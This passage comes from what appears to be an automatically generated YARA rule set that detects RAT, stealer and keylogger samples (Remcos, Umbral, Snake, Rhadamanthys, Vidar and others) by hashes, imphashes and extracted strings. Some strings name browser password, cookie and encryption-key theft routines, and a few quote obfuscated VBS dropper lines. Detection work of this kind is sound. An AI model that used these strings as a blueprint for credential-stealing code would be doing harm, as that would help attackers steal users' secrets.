      $s15 = "PASSPORTNAME" fullword wide /* score: '12.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7ed0d71376e55d58ab36dc7d3ffda898_imphash__RemcosRAT_signature__7ed0d71376e55d58ab36dc7d3ffda898_imphas_15 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7ed0d71376e55d58ab36dc7d3ffda898(imphash).exe, RemcosRAT(signature)_7ed0d71376e55d58ab36dc7d3ffda898(imphash)_9a86a6ad.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0b6847dfae6c2262cc0225c533169736c4875463adeef4adcdeb09ba0a5ab54a"
      hash2 = "9a86a6ada4acc907951a3b507a1a9bd45d70b0b3972c44ff6363f242a6669449"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "ontrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssemb" ascii /* score: '25.00'*/
      $s3 = "ndency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asI" ascii /* score: '22.00'*/
      $s4 = "cleverest.exe" fullword wide /* score: '22.00'*/
      $s5 = "nstall System v3.0b0</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Commo" ascii /* score: '13.00'*/
      $s6 = "ker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatib" ascii /* score: '10.00'*/
      $s7 = "\"#2-\\-5" fullword ascii /* score: '9.00'*/ /* hex encoded string '%' */
      $s8 = ":GExEcm" fullword ascii /* score: '9.00'*/
      $s9 = "{lYIWLr* " fullword ascii /* score: '8.00'*/
      $s10 = "qzffzar" fullword ascii /* score: '8.00'*/
      $s11 = "eikpptu" fullword ascii /* score: '8.00'*/
      $s12 = "psychotheist" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "7ed0d71376e55d58ab36dc7d3ffda898" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _UmbralStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__UmbralStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a74_16 {
   meta:
      description = "_subset_batch - from files UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_142e0913.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3a7c54c18e2d346334d6fdd81596005b7cc8ea7307d5ba42d6bb4bacf0ca1970"
      hash2 = "142e09138e86700e4de88019b753a4c3a510361af7bf8a49442772aa714bfaf9"
   strings:
      $x1 = ";Umbral.payload.Components.Browsers.Opera+<GetPasswords>d__5" fullword ascii /* score: '38.00'*/
      $x2 = "=Umbral.payload.Components.Browsers.OperaGx+<GetPasswords>d__5" fullword ascii /* score: '38.00'*/
      $x3 = "AUmbral.payload.Components.Browsers.OperaGx+<GetEncryptionKey>d__3" fullword ascii /* score: '36.00'*/
      $x4 = "9Umbral.payload.Components.Browsers.Opera+<GetCookies>d__6" fullword ascii /* score: '36.00'*/
      $x5 = "AUmbral.payload.Components.Browsers.EpicPrivacy+<GetPasswords>d__5" fullword ascii /* score: '36.00'*/
      $x6 = "8Umbral.payload.Components.Browsers.UR+<GetPasswords>d__5" fullword ascii /* score: '36.00'*/
      $x7 = "Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER" fullword wide /* score: '34.00'*/
      $x8 = ">Umbral.payload.Components.Browsers.Chromium+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x9 = "=Umbral.payload.Components.Browsers.Vivaldi+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x10 = "=Umbral.payload.Components.Browsers.Iridium+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x11 = ";Umbral.payload.Components.Browsers.OperaGx+<GetCookies>d__6" fullword ascii /* score: '33.00'*/
      $x12 = "<Umbral.payload.Components.Browsers.Chrome+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x13 = "<Umbral.payload.Components.Browsers.Yandex+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x14 = ";Umbral.payload.Components.Browsers.Brave+<GetPasswords>d__5" fullword ascii /* score: '33.00'*/
      $x15 = "?Umbral.payload.Components.Browsers.Opera+<GetEncryptionKey>d__3" fullword ascii /* score: '33.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphash__ValleyRAT_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__17 {
   meta:
      description = "_subset_batch - from files Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash2 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
   strings:
      $s1 = "runtime.mapKeyError" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mapKeyError2" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.totalMutexWaitTimeNanos" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s5 = "runtime.stackPoisonCopy" fullword ascii /* score: '20.00'*/
      $s6 = "type:.eq.golang.org/x/sys/windows.DLL" fullword ascii /* score: '20.00'*/
      $s7 = "type:.eq.golang.org/x/sys/windows.DLLError" fullword ascii /* score: '19.00'*/
      $s8 = "go:itab.*golang.org/x/sys/windows.DLLError,error" fullword ascii /* score: '19.00'*/
      $s9 = "runtime.(*rwmutex).init" fullword ascii /* score: '18.00'*/
      $s10 = "golang.org/x/sys/windows.procGetSystemDirectoryW" fullword ascii /* score: '18.00'*/
      $s11 = "runtime.getlasterror.abi0" fullword ascii /* score: '18.00'*/
      $s12 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii /* score: '18.00'*/
      $s13 = "dressmspan.sweep: bad span stateinvalid profile bucket typeruntime: corrupted polldescruntime: netpollinit failedruntime: asyncP" ascii /* score: '18.00'*/
      $s14 = "runtime.preventErrorDialogs" fullword ascii /* score: '18.00'*/
      $s15 = "runtime.metricReader.compute" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4ed89812_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_18 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4ed89812.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ad70d6c6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4ed89812437a80fce23d4c00bafc70da61f00f23f8c0132863385686c2e8a06d"
      hash2 = "ad70d6c6d21f2f81955549cf07ef09b01fb18ef8e888b4c44d6933d0676cfce4"
   strings:
      $s1 = "get_HowManyTable" fullword ascii /* score: '9.00'*/
      $s2 = "M- -!I" fullword ascii /* score: '9.00'*/
      $s3 = "get_receiptWrite" fullword ascii /* score: '9.00'*/
      $s4 = "get_tablesManager" fullword ascii /* score: '9.00'*/
      $s5 = "get_ProductPrice" fullword ascii /* score: '9.00'*/
      $s6 = "get_ReceiptDateTime" fullword ascii /* score: '9.00'*/
      $s7 = "get_ReceiptMoney" fullword ascii /* score: '9.00'*/
      $s8 = "get_ReceiptID" fullword ascii /* score: '9.00'*/
      $s9 = "get_table_Products" fullword ascii /* score: '9.00'*/
      $s10 = "get_gb_Products" fullword ascii /* score: '9.00'*/
      $s11 = "get_ProductBarkod" fullword ascii /* score: '9.00'*/
      $s12 = "GetDbProducts" fullword ascii /* score: '9.00'*/
      $s13 = "get_productManager" fullword ascii /* score: '9.00'*/
      $s14 = "get_dateTime" fullword ascii /* score: '9.00'*/
      $s15 = "get_product" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__19 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash11 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash12 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash13 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash14 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash15 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash16 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash17 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash18 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash19 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash20 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.(*rwmutex).rlock.func1" fullword ascii /* score: '18.00'*/
      $s10 = "runtime.getlasterror" fullword ascii /* score: '18.00'*/
      $s11 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
      $s12 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
      $s13 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s14 = "runtime.putempty" fullword ascii /* score: '17.00'*/
      $s15 = "runtime.startTemplateThread" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__323400e787f54999075321a066873519_imphash__Vidar_signature__2ac8b73847300d510d18583a55f34e2f_imphash_20 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_323400e787f54999075321a066873519(imphash).exe, Vidar(signature)_2ac8b73847300d510d18583a55f34e2f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "67d842cdd24d2ee0da69fdab43b3ab111f671b770d140e844f33eef71e0283c7"
      hash2 = "b769d0b69427a2c604456819e7e3afe53c65f5ae0df4d45d3ab5dcfdeddeb2ad"
   strings:
      $s1 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii /* score: '16.50'*/
      $s2 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii /* score: '16.50'*/
      $s3 = "error in %s %s%s%s: %s" fullword ascii /* score: '16.50'*/
      $s4 = "SqlExec" fullword ascii /* score: '16.00'*/
      $s5 = "REINDEXEDESCAPEACHECKEYBEFOREIGNOREGEXPLAINSTEADDATABASELECTABLEFTHENDEFERRABLELSEXCLUDELETEMPORARYISNULLSAVEPOINTERSECTIESNOTNU" ascii /* score: '15.00'*/
      $s6 = "MUTEX_W32" fullword ascii /* score: '15.00'*/
      $s7 = "USE TEMP B-TREE FOR %s(DISTINCT)" fullword ascii /* score: '14.00'*/
      $s8 = "USE TEMP B-TREE FOR %s(ORDER BY)" fullword ascii /* score: '14.00'*/
      $s9 = "target object/alias may not appear in FROM clause: %s" fullword ascii /* score: '14.00'*/
      $s10 = "Failed to read ptrmap key=%u" fullword ascii /* score: '13.00'*/
      $s11 = "REINDEXEDESCAPEACHECKEYBEFOREIGNOREGEXPLAINSTEADDATABASELECTABLEFTHENDEFERRABLELSEXCLUDELETEMPORARYISNULLSAVEPOINTERSECTIESNOTNU" ascii /* score: '12.50'*/
      $s12 = "UPDATE %Q.sqlite_master SET type='%s', name=%Q, tbl_name=%Q, rootpage=#%d, sql=%Q WHERE rowid=#%d" fullword ascii /* score: '12.50'*/
      $s13 = "error in %s %s after %s: %s" fullword ascii /* score: '12.50'*/
      $s14 = "SQL logic error" fullword ascii /* score: '12.00'*/
      $s15 = "max rootpage (%u) disagrees with header (%u)" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__323400e787f54999075321a066873519_imphash__RustyStealer_signature__5a6918475315610cd8a16ebae564d23d__21 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_323400e787f54999075321a066873519(imphash).exe, RustyStealer(signature)_5a6918475315610cd8a16ebae564d23d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "67d842cdd24d2ee0da69fdab43b3ab111f671b770d140e844f33eef71e0283c7"
      hash2 = "2063c4a79c44b398869e1296447f5e687d428113f62f1f22665d8bb5d9c9dda6"
   strings:
      $s1 = "StreamRef::drop; mutex poisoned" fullword ascii /* score: '27.00'*/
      $s2 = "Switching ProtocolsProcessingOKCreatedNon Authoritative InformationNo ContentReset ContentPartial ContentMulti-StatusAlready Rep" ascii /* score: '25.00'*/
      $s3 = "attempted to use a condition variable with more than one mutex" fullword ascii /* score: '24.00'*/
      $s4 = "inactive streamunexpected frame typepayload too bigrejectedrelease capacity too bigstream ID overflowedmalformed headersrequest " ascii /* score: '23.00'*/
      $s5 = "assertion failed: head.len() + tail.len() <= 8" fullword ascii /* score: '19.00'*/
      $s6 = "ServerExtensionClientHelloPayload" fullword ascii /* score: '18.00'*/
      $s7 = "too_many_resetsassertion failed: self.max_stream_id >= last_processed_id" fullword ascii /* score: '18.00'*/
      $s8 = "a spawned task panicked and the runtime is configured to shut down on unhandled panic" fullword ascii /* score: '18.00'*/
      $s9 = "alid HTTP header parsedinvalid content-length parsedunexpected transfer-encoding parsedmessage head is too largeinvalid HTTP sta" ascii /* score: '17.00'*/
      $s10 = "ddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesystemLoopStale" ascii /* score: '17.00'*/
      $s11 = "inactive streamunexpected frame typepayload too bigrejectedrelease capacity too bigstream ID overflowedmalformed headersrequest " ascii /* score: '17.00'*/
      $s12 = "504948474645444342414039383736" wide /* score: '17.00'*/ /* hex encoded string 'PIHGFEDCBA@9876' */
      $s13 = "(SSL.com Root Certification Authority RSA0" fullword ascii /* score: '16.00'*/
      $s14 = "mpletedreceived unexpected message from connectionoperation was canceledchannel closederror trying to connecterror reading a bod" ascii /* score: '16.00'*/
      $s15 = "+SSL.com EV Root Certification Authority ECC0" fullword ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c5a4_imphash__SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c_22 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash2 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
   strings:
      $s1 = ",System.ObjectModel.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '28.00'*/
      $s2 = "FSystem.Threading.Tasks.Parallel.dll" fullword ascii /* score: '26.00'*/
      $s3 = "GetNextSpan4ReadFirstTokenMultiSegment4SkipWhiteSpaceMultiSegment0ConsumeValueMultiSegment4ConsumeLiteralMultiSegment0CheckLiter" ascii /* score: '22.00'*/
      $s4 = "DSystem.Text.RegularExpressions.dll>System.Threading.Tasks.Parallel" fullword ascii /* score: '22.00'*/
      $s5 = "`System.Collections.IDictionaryEnumerator.get_Key8System.IComparable.CompareTo@" fullword ascii /* score: '22.00'*/
      $s6 = "<EnsureContingentPropertiesInitialized>g__InitializeContingentProperties|81_0XSystem.Threading.IThreadPoolWorkItem.Execute6Inlin" ascii /* score: '22.00'*/
      $s7 = "<EnsureContingentPropertiesInitialized>g__InitializeContingentProperties|81_0XSystem.Threading.IThreadPoolWorkItem.Execute6Inlin" ascii /* score: '22.00'*/
      $s8 = "\"System.Memory.dll$System.ObjectModel" fullword ascii /* score: '19.00'*/
      $s9 = "InsertionSort`System.Collections.IEqualityComparer.GetHashCodeVSystem.Collections.IEqualityComparer.Equals@" fullword ascii /* score: '18.00'*/
      $s10 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstance8InitializeClosedInstanceSlowFInitializeClosedInstanceToInterf" ascii /* score: '18.00'*/
      $s11 = "ProcessComment FetchStreamStart" fullword ascii /* score: '18.00'*/
      $s12 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstance8InitializeClosedInstanceSlowFInitializeClosedInstanceToInterf" ascii /* score: '18.00'*/
      $s13 = "&CompareValueToValue.<ExecuteCallback>b__9_0@" fullword ascii /* score: '17.00'*/
      $s14 = "kenOrRollbackMultiSegment8ConsumeNextTokenMultiSegmentfConsumeNextTokenFromLastNonCommentTokenMultiSegment6SkipAllCommentsMultiS" ascii /* score: '17.00'*/
      $s15 = "XGetInvalidOperationException_ReadInvalidUTF8" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and pe.imphash() == "636312a5ec1f8b9f790598a6e097c5a4" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__91d07a5e22681e70764519ae943a5883_imphash__RemcosRAT_signature__91d07a5e22681e70764519ae943a5883_imphas_23 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_91d07a5e22681e70764519ae943a5883(imphash).exe, RemcosRAT(signature)_91d07a5e22681e70764519ae943a5883(imphash)_1233b7db.exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_48ab1f1d.exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_6e038a0d.exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_88a44698.exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_cbded03b.exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_d32c93f3.exe, SnakeKeylogger(signature)_91d07a5e22681e70764519ae943a5883(imphash).exe, SnakeKeylogger(signature)_91d07a5e22681e70764519ae943a5883(imphash)_24314882.exe, SnakeKeylogger(signature)_91d07a5e22681e70764519ae943a5883(imphash)_d03c9135.exe, StormKitty(signature)_6c9794990dcbb89d798ebf671bb8138f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d3f5748e7efd5d8d4a483bbfa3cc86a92f2bc6fab7f06b984ddf7d87ce33f4dd"
      hash2 = "1233b7db91898df600fcdc3f572efe9a0852361891ca2cc04a45cf1aab585f41"
      hash3 = "3458469a031246c469a99a7b9ce953a2bf1ab46f3a18b25c8b8d454d13c789eb"
      hash4 = "48ab1f1df7bd293ffc6f49b75a3563aff00dc86990510c1e29563309f2350b44"
      hash5 = "6e038a0d0e3367c4a0bb4bcdb9c6cc9cbf280f97a23033bb68e49fbe86fcc048"
      hash6 = "88a446983108870556c6a2d6ca548d89462e5c63ed42edc017dd5f3e23c3ef61"
      hash7 = "cbded03b82e0ab53202c6d42d37f7f35228410e75770e370b74215372c8355cf"
      hash8 = "d32c93f3b042abc7ba1e686a2a40264718bd0d7ecd990433e2429b0558bc48c6"
      hash9 = "5851f2775a8121c1f942ee8bd8994a43efa931500b96aa37dc1a045812b9c155"
      hash10 = "24314882d285c55d46ee5387af3fdc1fc780c26f262416235c1fe148f2a01c5c"
      hash11 = "d03c9135f1f77622a7db40ad660b3ea55b2bf5008c97ce3b8908564c50ff6a34"
      hash12 = "dd3054a21628f4820afd1532e1e8064f78373ff873af2259d220a60518f640e1"
   strings:
      $s1 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s2 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s3 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s4 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s5 = "SCRIPTNAME" fullword wide /* base64 encoded string 'H$H=3@0' */ /* score: '22.50'*/
      $s6 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s7 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s9 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s10 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s11 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSLIST" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__acb97f311176c6761732879ff5096c34_imphash__SnakeKeylogger_signature__d9d3dc366861974d56e9cfc24758d03_24 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash2 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
   strings:
      $x1 = "BSystem.Net.NetworkInformation.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '34.00'*/
      $x2 = "System.Runtime, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&DllImportSearchPath" fullword ascii /* score: '32.00'*/
      $s3 = "NSystem.ComponentModel.TypeConverter.dll:System.Collections.Concurrent" fullword ascii /* score: '25.00'*/
      $s4 = "System.Linq.dll:System.Net.NetworkInformation" fullword ascii /* score: '22.00'*/
      $s5 = "MimeKit.dll$System.ObjectModel" fullword ascii /* score: '22.00'*/
      $s6 = "ExecutionDomain.ReflectionCoreExecution" fullword ascii /* score: '19.00'*/
      $s7 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstance@" fullword ascii /* score: '18.00'*/
      $s8 = "<Execute>b__7_0@" fullword ascii /* score: '18.00'*/
      $s9 = "The output buffer is not large enough to contain the decoded input" fullword wide /* score: '18.00'*/
      $s10 = "ContentEncoding.HeaderListChangedAction" fullword ascii /* score: '17.00'*/
      $s11 = "Processg" fullword ascii /* score: '17.00'*/
      $s12 = ",TryGetEncodedWordToken" fullword ascii /* score: '17.00'*/
      $s13 = ".ReceivedTokenSkipDomain0ReceivedTokenSkipAddress4ReceivedTokenSkipMessageId(EncodeReceivedHeaderBEncodeAuthenticationResultsHea" ascii /* score: '16.00'*/
      $s14 = "TElement$IPGlobalProperties0SystemIPGlobalPropertiesDExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s15 = "The output buffer is not large enough to contain the encoded input" fullword wide /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__57f5111e_RemcosRAT_signature__dfd63ceb_25 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_57f5111e.vbs, RemcosRAT(signature)_dfd63ceb.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "57f5111ee52bcd3bcfb0233efdd8303e0c716efaf028520d3a62b8f832099d09"
      hash2 = "dfd63ceb1b32ed35185764222f6c7173ba9d071d170ba77acc80952ca1d14ce5"
   strings:
      $s1 = "Interconnectionshjlpe = Command " fullword ascii /* score: '17.00'*/
      $s2 = "Uopdagetbinderiesv = Uopdagetbinderiesv * (1+1)" fullword ascii /* score: '16.00'*/
      $s3 = "Rem Trackpot? tempelhal. squamosoradiate: oprundnes" fullword ascii /* score: '14.00'*/
      $s4 = "Wscript.Sleep 100" fullword ascii /* score: '13.00'*/
      $s5 = "Rem Staldfidusers medisterplse" fullword ascii /* score: '12.00'*/
      $s6 = "Rem Beteem: breviloquence langfingrenes superport udbenede" fullword ascii /* score: '12.00'*/
      $s7 = "Curculionidaejockeyern = MidB(\"Afvigende\", 15, 228)" fullword ascii /* score: '12.00'*/
